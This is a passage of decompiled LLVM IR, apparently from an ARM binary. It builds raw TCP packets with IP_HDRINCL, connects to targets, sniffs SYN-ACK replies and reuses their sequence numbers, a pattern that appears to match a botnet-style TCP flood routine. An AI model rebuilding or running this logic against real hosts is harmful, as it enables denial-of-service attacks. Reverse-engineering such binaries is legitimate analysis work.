  %v5_bec0 = call i32 @function_92dc(i32 %v0_bebc, i32* %v4_bec0, i32 4, i32 64)
  %v1_bec8 = urem i32 %v5_bec0, 256
  store i32 %v1_bec8, i32* %ip.global-to-local, align 4
  %v0_becc = load i32, i32* @r5, align 4
  store i32 %v0_becc, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bed8 = load i32, i32* @r4, align 4
  store i32 %v0_bed8, i32* %r0.global-to-local, align 4
  %v6_bee0 = inttoptr i32 %v0_becc to i32*
  %v7_bee0 = call i32 @function_92dc(i32 %v0_bed8, i32* %v6_bee0, i32 5, i32 1)
  %v1_beec = urem i32 %v7_bee0, 256
  store i32 %v1_beec, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  %v0_bef4 = load i32, i32* @r5, align 4
  store i32 %v0_bef4, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_befc = load i32, i32* @r4, align 4
  store i32 %v0_befc, i32* %r0.global-to-local, align 4
  %v5_bf04 = inttoptr i32 %v0_bef4 to i32*
  %v6_bf04 = call i32 @function_92dc(i32 %v0_befc, i32* %v5_bf04, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_bf08 = load i32, i32* @r5, align 4
  store i32 %v0_bf08, i32* %r1.global-to-local, align 4
  %v3_bf0c = mul i32 %v6_bf04, 65536
  store i32 %v3_bf0c, i32* @r7, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bf18 = load i32, i32* @r4, align 4
  store i32 %v0_bf18, i32* %r0.global-to-local, align 4
  %v4_bf1c = inttoptr i32 %v0_bf08 to i32*
  %v5_bf1c = call i32 @function_92dc(i32 %v0_bf18, i32* %v4_bf1c, i32 11, i32 1)
  %v1_bf24 = urem i32 %v5_bf1c, 256
  store i32 %v1_bf24, i32* %ip.global-to-local, align 4
  %v0_bf28 = load i32, i32* @r5, align 4
  store i32 %v0_bf28, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bf34 = load i32, i32* @r4, align 4
  store i32 %v0_bf34, i32* %r0.global-to-local, align 4
  %v5_bf3c = inttoptr i32 %v0_bf28 to i32*
  %v6_bf3c = call i32 @function_92dc(i32 %v0_bf34, i32* %v5_bf3c, i32 12, i32 1)
  %v1_bf44 = urem i32 %v6_bf3c, 256
  store i32 %v1_bf44, i32* %ip.global-to-local, align 4
  %v0_bf48 = load i32, i32* @r5, align 4
  store i32 %v0_bf48, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bf54 = load i32, i32* @r4, align 4
  store i32 %v0_bf54, i32* %r0.global-to-local, align 4
  %v5_bf5c = inttoptr i32 %v0_bf48 to i32*
  %v6_bf5c = call i32 @function_92dc(i32 %v0_bf54, i32* %v5_bf5c, i32 13, i32 1)
  %v1_bf64 = urem i32 %v6_bf5c, 256
  store i32 %v1_bf64, i32* %ip.global-to-local, align 4
  %v0_bf68 = load i32, i32* @r5, align 4
  store i32 %v0_bf68, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bf74 = load i32, i32* @r4, align 4
  store i32 %v0_bf74, i32* %r0.global-to-local, align 4
  %v5_bf7c = inttoptr i32 %v0_bf68 to i32*
  %v6_bf7c = call i32 @function_92dc(i32 %v0_bf74, i32* %v5_bf7c, i32 14, i32 1)
  %v1_bf84 = urem i32 %v6_bf7c, 256
  store i32 %v1_bf84, i32* %ip.global-to-local, align 4
  %v0_bf88 = load i32, i32* @r5, align 4
  store i32 %v0_bf88, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bf94 = load i32, i32* @r4, align 4
  store i32 %v0_bf94, i32* %r0.global-to-local, align 4
  %v5_bf9c = inttoptr i32 %v0_bf88 to i32*
  %v6_bf9c = call i32 @function_92dc(i32 %v0_bf94, i32* %v5_bf9c, i32 15, i32 1)
  %v1_bfa4 = urem i32 %v6_bf9c, 256
  store i32 %v1_bfa4, i32* %ip.global-to-local, align 4
  %v0_bfa8 = load i32, i32* @r5, align 4
  store i32 %v0_bfa8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bfb4 = load i32, i32* @r4, align 4
  store i32 %v0_bfb4, i32* %r0.global-to-local, align 4
  %v5_bfbc = inttoptr i32 %v0_bfa8 to i32*
  %v6_bfbc = call i32 @function_92dc(i32 %v0_bfb4, i32* %v5_bfbc, i32 16, i32 1)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v6_bfbc, i32* %ip.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_bfcc = load i32, i32* @r5, align 4
  store i32 %v0_bfcc, i32* %r1.global-to-local, align 4
  %v0_bfd0 = load i32, i32* @r4, align 4
  store i32 %v0_bfd0, i32* %r0.global-to-local, align 4
  %v1_bfd4 = urem i32 %v6_bfbc, 256
  store i32 %v1_bfd4, i32* @r8, align 4
  %v4_bfd8 = inttoptr i32 %v0_bfcc to i32*
  %v5_bfd8 = call i32 @function_92dc(i32 %v0_bfd0, i32* %v4_bfd8, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bfe4 = load i32, i32* @r5, align 4
  store i32 %v0_bfe4, i32* %r1.global-to-local, align 4
  store i32 %v5_bfd8, i32* @sb, align 4
  %v0_bfec = load i32, i32* @r4, align 4
  store i32 %v0_bfec, i32* %r0.global-to-local, align 4
  %v4_bff0 = inttoptr i32 %v0_bfe4 to i32*
  %v5_bff0 = call i32 @function_92dc(i32 %v0_bfec, i32* %v4_bff0, i32 1, i32 1)
  store i32 3, i32* %r1.global-to-local, align 4
  %v1_bffc = urem i32 %v5_bff0, 256
  store i32 %v1_bffc, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_c00c = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_c00c, i32* %r0.global-to-local, align 4
  %v0_c010 = load i32, i32* @r7, align 4
  %v3_c010 = udiv i32 %v0_c010, 65536
  store i32 %v3_c010, i32* %r1.global-to-local, align 4
  %v2_c014 = icmp eq i32 %v3_c00c, -1
  store i1 %v2_c014, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c014, label %dec_label_pc_c298, label %dec_label_pc_c024

dec_label_pc_c024:                                ; preds = %dec_label_pc_be3c
  store i32 1, i32* %stack_var_-40, align 4
  %v6_c02c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_c02c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_c040 = call i32 @setsockopt(i32 %v3_c00c, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v7_c040, i32* %r0.global-to-local, align 4
  %v2_c044 = icmp eq i32 %v7_c040, -1
  store i1 %v2_c044, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c044, label %dec_label_pc_c290, label %dec_label_pc_c04c

dec_label_pc_c04c:                                ; preds = %dec_label_pc_c024
  %v0_c04c = load i32, i32* @fp, align 4
  %v2_c04c = icmp eq i32 %v0_c04c, 0
  store i1 %v2_c04c, i1* %cpsr_z.global-to-local, align 1
  %v0_c050 = load i32, i32* @r6, align 4
  %v3_c050 = mul i32 %v0_c050, 65536
  store i32 %v3_c050, i32* %r0.global-to-local, align 4
  %v3_c054 = urem i32 %v0_c050, 65536
  store i32 %v3_c054, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp85 = icmp slt i32 %v0_c04c, 1
  br i1 %tmp85, label %.thread27, label %dec_label_pc_c078.preheader

.thread27:                                        ; preds = %dec_label_pc_c04c
  store i32 0, i32* %stack_var_-40, align 4
  br label %dec_label_pc_c518

dec_label_pc_c078.preheader:                      ; preds = %dec_label_pc_c04c
  %v5_c05c = load i32, i32* @r7, align 4
  %v8_c05c = udiv i32 %v5_c05c, 16777216
  %tmp86 = udiv i32 %v0_c050, 256
  %v8_c060 = urem i32 %tmp86, 256
  store i32 %v8_c060, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v1_c084 = urem i32 %v0_c050, 256
  %v9_c170 = icmp eq i32 %v3_c010, add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1)
  %v2_c194 = ptrtoint i32* %stack_var_-60 to i32
  %tmp87 = bitcast i32* %stack_var_-60 to %sockaddr*
  %v4_c1b0 = mul nuw nsw i32 %v1_c084, 256
  %v5_c1b0 = or i32 %v8_c060, %v4_c1b0
  %sext11 = mul i32 %tmp86, 16777216
  %v4_c1bc = sdiv i32 %sext11, 16777216
  %v3_c1c4 = ashr i32 %sext11, 31
  %tmp88 = bitcast i32* %stack_var_-76 to %sockaddr*
  %v2_c1f4 = ptrtoint i32* %stack_var_-332 to i32
  %v2_c1f8 = ptrtoint i32* %stack_var_-44 to i32
  %v4_c240 = zext i8 %tmp41 to i32
  %v4_c244 = zext i8 %tmp40 to i32
  %v4_c250 = mul nuw nsw i32 %v4_c244, 256
  %v4_c260 = zext i8 %tmp to i32
  %v1_c264 = and i32 %v4_c260, 18
  %v2_c268 = icmp eq i32 %v1_c264, 18
  %v1_c180 = mul nuw nsw i32 %v3_c010, 256
  %v4_c184 = and i32 %v1_c180, 65280
  %v5_c184 = or i32 %v8_c05c, %v4_c184
  %v3_c188113 = udiv i32 %v4_c184, 256
  %v1_c18c = trunc i32 %v3_c188113 to i8
  %sext = mul i32 %v6_be84, 16777216
  %v4_c38c = sdiv i32 %sext, 16777216
  %sext9 = mul i32 %v5_bec0, 16777216
  %v4_c3a0 = sdiv i32 %sext9, 16777216
  %v5_c250 = or i32 %v4_c240, %v4_c250
  %v1_c270 = and i32 %v4_c260, 5
  %v2_c270 = icmp eq i32 %v1_c270, 0
  %v1_c190 = trunc i32 %v8_c05c to i8
  %v1_c39c = trunc i32 %v4_c38c to i8
  %v1_c468 = urem i32 %v5_bf1c, 2
  %tmp114 = sub nsw i32 0, %v1_c468
  %v4_c470 = and i32 %tmp114, 32
  %v1_c480 = urem i32 %v6_bf3c, 2
  %tmp115 = sub nsw i32 0, %v1_c480
  %v4_c488 = and i32 %tmp115, 16
  %v1_c498 = urem i32 %v6_bf5c, 2
  %tmp116 = sub nsw i32 0, %v1_c498
  %v4_c4a0 = and i32 %tmp116, 8
  %v1_c4b0 = urem i32 %v6_bf7c, 2
  %tmp117 = sub nsw i32 0, %v1_c4b0
  %v4_c4b8 = and i32 %tmp117, 4
  %v1_c4c8 = urem i32 %v6_bf9c, 2
  %tmp118 = sub nsw i32 0, %v1_c4c8
  %v3_c4d0 = and i32 %tmp118, 2
  br label %dec_label_pc_c078

dec_label_pc_c078:                                ; preds = %dec_label_pc_c504, %dec_label_pc_c278, %dec_label_pc_c078.preheader
  store i32 %v8_c060, i32* %r3.global-to-local, align 4
  store i32 %v1_c084, i32* %ip.global-to-local, align 4
  %v0_c090 = load i32, i32* @sb, align 4
  %v1_c090 = add i32 %v0_c090, 40
  store i32 %v1_c090, i32* @sl, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c0a0107 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_c0a0107, i32* %r0.global-to-local, align 4
  %v2_c0a4108 = icmp eq i32 %v3_c0a0107, -1
  store i1 %v2_c0a4108, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c0a0107, i32* @r7, align 4
  br i1 %v2_c0a4108, label %dec_label_pc_c504, label %dec_label_pc_c0b0

dec_label_pc_c0b0:                                ; preds = %dec_label_pc_c078, %dec_label_pc_c284
  %v3_c0a0109 = phi i32 [ %v3_c0a0, %dec_label_pc_c284 ], [ %v3_c0a0107, %dec_label_pc_c078 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c0b8 = call i32 (i32, i32, ...) @fcntl(i32 %v3_c0a0109, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_c0c0 = or i32 %v2_c0b8, 2048
  store i32 %v1_c0c0, i32* %r2.global-to-local, align 4
  %v0_c0c4 = load i32, i32* @r7, align 4
  store i32 %v0_c0c4, i32* %r0.global-to-local, align 4
  %v2_c0c8 = call i32 (i32, i32, ...) @fcntl(i32 %v0_c0c4, i32 4)
  %v3_c0cc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c0cc, i32* %ip.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  %v5_c0e8 = mul i32 %v3_c0cc, 24
  store i32 %v5_c0e8, i32* %r1.global-to-local, align 4
  %v2_c0ec = add i32 %v5_c0e8, %arg2
  store i32 %v2_c0ec, i32* %r2.global-to-local, align 4
  %v1_c0f0 = add i32 %v2_c0ec, 20
  %v2_c0f0 = inttoptr i32 %v1_c0f0 to i8*
  %v3_c0f0 = load i8, i8* %v2_c0f0, align 1
  %v4_c0f0 = zext i8 %v3_c0f0 to i32
  store i32 %v4_c0f0, i32* %r3.global-to-local, align 4
  %v2_c0f4 = icmp ugt i8 %v3_c0f0, 30
  %v7_c0f4 = icmp eq i8 %v3_c0f0, 31
  store i1 %v7_c0f4, i1* %cpsr_z.global-to-local, align 1
  %v2_c0f8 = xor i1 %v7_c0f4, true
  %v3_c0f8 = and i1 %v2_c0f4, %v2_c0f8
  %v5_c0f8 = add i32 %v2_c0ec, 16
  %v6_c0f8 = inttoptr i32 %v5_c0f8 to i32*
  %v7_c0f8 = load i32, i32* %v6_c0f8, align 4
  br i1 %v3_c0f8, label %dec_label_pc_c164, label %dec_label_pc_c104

dec_label_pc_c104:                                ; preds = %dec_label_pc_c0b0
  store i32 %v7_c0f8, i32* %r4.global-to-local, align 4
  %v0_c108 = call i32 @function_f67c()
  store i32 %v0_c108, i32* %r0.global-to-local, align 4
  %v3_c10c = load i32, i32* %stack_var_-40, align 4
  %v5_c114 = mul i32 %v3_c10c, 24
  %v2_c120 = add i32 %v5_c114, %arg2
  store i32 %v2_c120, i32* %r1.global-to-local, align 4
  %v1_c11c = udiv i32 %v7_c0f8, 256
  %v3_c124 = and i32 %v1_c11c, 65280
  store i32 %v3_c124, i32* %r2.global-to-local, align 4
  %v1_c128 = and i32 %v7_c0f8, 65280
  store i32 %v1_c128, i32* %r3.global-to-local, align 4
  %v3_c12c = mul i32 %v7_c0f8, 16777216
  store i32 %v3_c12c, i32* %ip.global-to-local, align 4
  %v1_c130 = add i32 %v2_c120, 20
  %v2_c130 = inttoptr i32 %v1_c130 to i8*
  %v3_c130 = load i8, i8* %v2_c130, align 1
  %v4_c130 = zext i8 %v3_c130 to i32
  store i32 %v4_c130, i32* %lr.global-to-local, align 4
  %v4_c134 = mul nuw nsw i32 %v1_c128, 256
  %v5_c134 = or i32 %v4_c134, %v3_c12c
  store i32 %v5_c134, i32* %ip.global-to-local, align 4
  %v2_c13c = call i32 @llvm.bswap.i32(i32 %v7_c0f8)
  %v7_c140 = lshr i32 %v0_c108, %v4_c130
  %v8_c140 = add i32 %v7_c140, %v2_c13c
  store i32 %v8_c140, i32* %r2.global-to-local, align 4
  %v3_c14c = mul i32 %v8_c140, 16777216
  %v1_c150 = and i32 %v8_c140, 65280
  store i32 %v1_c150, i32* %r0.global-to-local, align 4
  %v4_c154 = mul nuw nsw i32 %v1_c150, 256
  %v5_c154 = or i32 %v4_c154, %v3_c14c
  store i32 %v5_c154, i32* %r1.global-to-local, align 4
  %v2_c15c = call i32 @llvm.bswap.i32(i32 %v8_c140)
  br label %dec_label_pc_c164

dec_label_pc_c164:                                ; preds = %dec_label_pc_c0b0, %dec_label_pc_c104
  %storemerge35 = phi i32 [ %v2_c15c, %dec_label_pc_c104 ], [ %v7_c0f8, %dec_label_pc_c0b0 ]
  store i32 %v3_c010, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i1 %v9_c170, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c170, label %dec_label_pc_c2a0, label %dec_label_pc_c178

dec_label_pc_c178:                                ; preds = %dec_label_pc_c164
  store i32 %v3_c010, i32* %r0.global-to-local, align 4
  store i32 %v8_c05c, i32* %r1.global-to-local, align 4
  store i32 %v5_c184, i32* %r3.global-to-local, align 4
  store i32 %v3_c188113, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c194

dec_label_pc_c194:                                ; preds = %dec_label_pc_c2a0, %dec_label_pc_c178
  %stack_var_-57.0 = phi i8 [ %v1_c2a8, %dec_label_pc_c2a0 ], [ %v1_c18c, %dec_label_pc_c178 ]
  %storemerge = phi i8 [ %v1_c2a0, %dec_label_pc_c2a0 ], [ %v1_c190, %dec_label_pc_c178 ]
  store i32 %v2_c194, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_c19c = load i32, i32* @r7, align 4
  store i32 %v0_c19c, i32* %r0.global-to-local, align 4
  %v5_c1a0 = call i32 @connect(i32 %v0_c19c, %sockaddr* nonnull %tmp87, i32 16)
  store i32 %v1_c084, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v5_c1b0, i32* %r2.global-to-local, align 4
  %v2_c1b8 = call i32 @time(i32* null)
  store i32 %v2_c1b8, i32* %r0.global-to-local, align 4
  store i32 %v2_c1b8, i32* %r4.global-to-local, align 4
  store i32 %v3_c1c4, i32* %ip.global-to-local, align 4
  %v9_c224 = icmp eq i32 %tmp42, %storemerge35
  %v4_c248 = zext i8 %storemerge to i32
  %v4_c24c = zext i8 %stack_var_-57.0 to i32
  %. = zext i1 %v9_c224 to i32
  %v9_c238 = icmp eq i1 %v9_c224, false
  %v4_c254 = mul nuw nsw i32 %v4_c24c, 256
  %v5_c254 = or i32 %v4_c254, %v4_c248
  %v9_c258 = icmp eq i32 %v5_c254, %v5_c250
  br label %dec_label_pc_c1e0

dec_label_pc_c1d0:                                ; preds = %.thread33, %dec_label_pc_c240, %dec_label_pc_c270, %bb90
  %v2_c1d0 = call i32 @time(i32* null)
  %v0_c1d4 = load i32, i32* %r4.global-to-local, align 4
  %v2_c1d4 = sub i32 %v2_c1d0, %v0_c1d4
  store i32 %v2_c1d4, i32* %r0.global-to-local, align 4
  %v7_c1d8 = icmp eq i32 %v2_c1d4, 10
  store i1 %v7_c1d8, i1* %cpsr_z.global-to-local, align 1
  %v8_c1dc = icmp sgt i32 %v2_c1d4, 10
  br i1 %v8_c1dc, label %dec_label_pc_c284, label %dec_label_pc_c1e0

dec_label_pc_c1e0:                                ; preds = %dec_label_pc_c1d0, %dec_label_pc_c194
  store i32 16, i32* %stack_var_-44, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_c1f4, i32* %r1.global-to-local, align 4
  store i32 %v2_c1f8, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_c00c, i32* %r0.global-to-local, align 4
  %v10_c208 = call i32 @recvfrom(i32 %v3_c00c, i32* nonnull %stack_var_-332, i32 256, i32 16384, %sockaddr* %tmp88, i32* nonnull %stack_var_-44)
  store i32 %v10_c208, i32* %r2.global-to-local, align 4
  %v2_c210 = icmp eq i32 %v10_c208, -1
  store i1 %v2_c210, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v2_c210, label %dec_label_pc_c298, label %dec_label_pc_c21c

dec_label_pc_c21c:                                ; preds = %dec_label_pc_c1e0
  store i32 %storemerge35, i32* %lr.global-to-local, align 4
  store i32 %tmp42, i32* %r3.global-to-local, align 4
  store i32 %., i32* %r1.global-to-local, align 4
  %v7_c230 = icmp eq i32 %v10_c208, 40
  store i1 %v7_c230, i1* %cpsr_z.global-to-local, align 1
  %tmp119 = icmp ult i32 %v10_c208, 41
  br i1 %tmp119, label %.thread33, label %bb90

.thread33:                                        ; preds = %dec_label_pc_c21c
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_c1d0

bb90:                                             ; preds = %dec_label_pc_c21c
  store i1 %v9_c238, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c238, label %dec_label_pc_c1d0, label %dec_label_pc_c240

dec_label_pc_c240:                                ; preds = %bb90
  store i32 %v4_c244, i32* %r1.global-to-local, align 4
  store i32 %v4_c248, i32* %ip.global-to-local, align 4
  store i32 %v4_c24c, i32* %r2.global-to-local, align 4
  store i32 %v5_c250, i32* %r3.global-to-local, align 4
  store i32 %v5_c254, i32* @r5, align 4
  store i1 %v9_c258, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c258, label %dec_label_pc_c260, label %dec_label_pc_c1d0

dec_label_pc_c260:                                ; preds = %dec_label_pc_c240
  store i32 %v4_c260, i32* %r2.global-to-local, align 4
  store i32 %v1_c264, i32* %r3.global-to-local, align 4
  store i1 %v2_c268, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c268, label %dec_label_pc_c2b4, label %dec_label_pc_c270

dec_label_pc_c270:                                ; preds = %dec_label_pc_c260
  store i1 %v2_c270, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c270, label %dec_label_pc_c1d0, label %dec_label_pc_c278

dec_label_pc_c278:                                ; preds = %dec_label_pc_c270
  %v0_c278 = load i32, i32* @r7, align 4
  store i32 %v0_c278, i32* %r0.global-to-local, align 4
  %v1_c27c = call i32 @close(i32 %v0_c278)
  store i32 %v1_c27c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c078

dec_label_pc_c284:                                ; preds = %dec_label_pc_c1d0
  %v0_c284 = load i32, i32* @r7, align 4
  store i32 %v0_c284, i32* %r0.global-to-local, align 4
  %v1_c288 = call i32 @close(i32 %v0_c284)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c0a0 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_c0a0, i32* %r0.global-to-local, align 4
  %v2_c0a4 = icmp eq i32 %v3_c0a0, -1
  store i1 %v2_c0a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c0a0, i32* @r7, align 4
  br i1 %v2_c0a4, label %dec_label_pc_c504, label %dec_label_pc_c0b0

dec_label_pc_c290:                                ; preds = %dec_label_pc_c024
  store i32 %v3_c00c, i32* %r0.global-to-local, align 4
  %v1_c294 = call i32 @close(i32 %v3_c00c)
  store i32 %v1_c294, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c298

dec_label_pc_c298:                                ; preds = %dec_label_pc_c1e0, %dec_label_pc_be3c, %dec_label_pc_c290
  %v29_c29c = phi i32 [ -1, %dec_label_pc_be3c ], [ %v1_c294, %dec_label_pc_c290 ], [ 0, %dec_label_pc_c1e0 ]
  store i32 %v3_be3c, i32* %r4.global-to-local, align 4
  ret i32 %v29_c29c

dec_label_pc_c2a0:                                ; preds = %dec_label_pc_c164
  %v0_c2a0 = call i32 @function_f67c()
  %v1_c2a0 = trunc i32 %v0_c2a0 to i8
  store i32 %v0_c2a0, i32* %r0.global-to-local, align 4
  %v4_c2a4 = sdiv i32 %v0_c2a0, 256
  store i32 %v4_c2a4, i32* %r3.global-to-local, align 4
  %v1_c2a8 = trunc i32 %v4_c2a4 to i8
  br label %dec_label_pc_c194

dec_label_pc_c2b4:                                ; preds = %dec_label_pc_c260
  %v3_c2b4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c2b4, i32* %r4.global-to-local, align 4
  store i32 %v4_be5c, i32* %r2.global-to-local, align 4
  %v3_c2bc = mul i32 %v3_c2b4, 16
  store i32 %v3_c2bc, i32* %ip.global-to-local, align 4
  %v3_c2c0 = add i32 %v3_c2bc, %v4_be5c
  %v4_c2c0 = inttoptr i32 %v3_c2c0 to i32*
  store i32 %storemerge35, i32* %v4_c2c0, align 4
  %v0_c2c4 = load i32, i32* @r6, align 4
  %v1_c2c4 = add i32 %v0_c2c4, 4
  %v2_c2c4 = inttoptr i32 %v1_c2c4 to i32*
  %v3_c2c4 = load i32, i32* %v2_c2c4, align 4
  %v1_c2d0 = and i32 %v3_c2c4, 65280
  store i32 %v1_c2d0, i32* %r1.global-to-local, align 4
  %v3_c2d4 = mul i32 %v3_c2c4, 16777216
  store i32 %v4_be5c, i32* %r0.global-to-local, align 4
  %v4_c2e0 = mul nuw nsw i32 %v1_c2d0, 256
  %v5_c2e0 = or i32 %v4_c2e0, %v3_c2d4
  store i32 %v5_c2e0, i32* %r2.global-to-local, align 4
  %v1_c2e4 = load i32, i32* %ip.global-to-local, align 4
  %v2_c2e4 = add i32 %v1_c2e4, %v4_be5c
  store i32 %v2_c2e4, i32* %ip.global-to-local, align 4
  %v2_c2e8 = call i32 @llvm.bswap.i32(i32 %v3_c2c4)
  store i32 %v2_c2e8, i32* %r3.global-to-local, align 4
  %v2_c2ec = add i32 %v2_c2e4, 4
  %v3_c2ec = inttoptr i32 %v2_c2ec to i32*
  store i32 %v2_c2e8, i32* %v3_c2ec, align 4
  %v0_c2f0 = load i32, i32* @r6, align 4
  %v1_c2f0 = add i32 %v0_c2f0, 8
  %v2_c2f0 = inttoptr i32 %v1_c2f0 to i32*
  %v3_c2f0 = load i32, i32* %v2_c2f0, align 4
  store i32 %v3_c2f0, i32* %r0.global-to-local, align 4
  %v1_c2f8 = and i32 %v3_c2f0, 65280
  store i32 %v1_c2f8, i32* %r1.global-to-local, align 4
  %v3_c2fc = mul i32 %v3_c2f0, 16777216
  %v4_c304 = mul nuw nsw i32 %v1_c2f8, 256
  %v5_c304 = or i32 %v4_c304, %v3_c2fc
  store i32 %v5_c304, i32* %r2.global-to-local, align 4
  %v2_c30c = call i32 @llvm.bswap.i32(i32 %v3_c2f0)
  store i32 %v2_c30c, i32* %r3.global-to-local, align 4
  %v1_c310 = load i32, i32* %ip.global-to-local, align 4
  %v2_c310 = add i32 %v1_c310, 8
  %v3_c310 = inttoptr i32 %v2_c310 to i32*
  store i32 %v2_c30c, i32* %v3_c310, align 4
  %v0_c314 = load i32, i32* @r6, align 4
  %v1_c314 = inttoptr i32 %v0_c314 to i32*
  %v2_c314 = load i32, i32* %v1_c314, align 4
  %v3_c318 = udiv i32 %v2_c314, 65536
  store i32 %v3_c318, i32* %r2.global-to-local, align 4
  %v3_c31c6 = udiv i32 %v2_c314, 16777216
  store i32 %v3_c31c6, i32* %r1.global-to-local, align 4
  %v0_c320 = load i32, i32* @r5, align 4
  %v3_c320 = sdiv i32 %v0_c320, 256
  store i32 %v3_c320, i32* %r3.global-to-local, align 4
  %v1_c324 = trunc i32 %v3_c320 to i8
  %v2_c324 = load i32, i32* %ip.global-to-local, align 4
  %v3_c324 = add i32 %v2_c324, 15
  %v4_c324 = inttoptr i32 %v3_c324 to i8*
  store i8 %v1_c324, i8* %v4_c324, align 1
  %v0_c328 = load i32, i32* %r1.global-to-local, align 4
  %v1_c328 = trunc i32 %v0_c328 to i8
  %v2_c328 = load i32, i32* %ip.global-to-local, align 4
  %v3_c328 = add i32 %v2_c328, 13
  %v4_c328 = inttoptr i32 %v3_c328 to i8*
  store i8 %v1_c328, i8* %v4_c328, align 1
  %v0_c32c = load i32, i32* %r2.global-to-local, align 4
  %v1_c32c = trunc i32 %v0_c32c to i8
  %v2_c32c = load i32, i32* %ip.global-to-local, align 4
  %v3_c32c = add i32 %v2_c32c, 12
  %v4_c32c = inttoptr i32 %v3_c32c to i8*
  store i8 %v1_c32c, i8* %v4_c32c, align 1
  %v0_c330 = load i32, i32* @r5, align 4
  %v1_c330 = trunc i32 %v0_c330 to i8
  %v2_c330 = load i32, i32* %ip.global-to-local, align 4
  %v3_c330 = add i32 %v2_c330, 14
  %v4_c330 = inttoptr i32 %v3_c330 to i8*
  store i8 %v1_c330, i8* %v4_c330, align 1
  %v0_c334 = load i32, i32* @sl, align 4
  store i32 %v0_c334, i32* %r0.global-to-local, align 4
  %v1_c338 = call i32* @malloc(i32 %v0_c334)
  %v3_c338 = ptrtoint i32* %v1_c338 to i32
  store i32 %v3_c338, i32* %r0.global-to-local, align 4
  store i32 %v4_be6c, i32* %r1.global-to-local, align 4
  %v3_c340 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c340, i32* %r2.global-to-local, align 4
  %v2_c344 = load i32, i32* %r4.global-to-local, align 4
  %v5_c344 = mul i32 %v2_c344, 4
  %v6_c344 = add i32 %v5_c344, %v4_be6c
  %v7_c344 = inttoptr i32 %v6_c344 to i32*
  store i32 %v3_c338, i32* %v7_c344, align 4
  %v0_c348 = load i32, i32* %r1.global-to-local, align 4
  %v1_c348 = load i32, i32* %r2.global-to-local, align 4
  %v4_c348 = mul i32 %v1_c348, 4
  %v5_c348 = add i32 %v4_c348, %v0_c348
  %v6_c348 = inttoptr i32 %v5_c348 to i32*
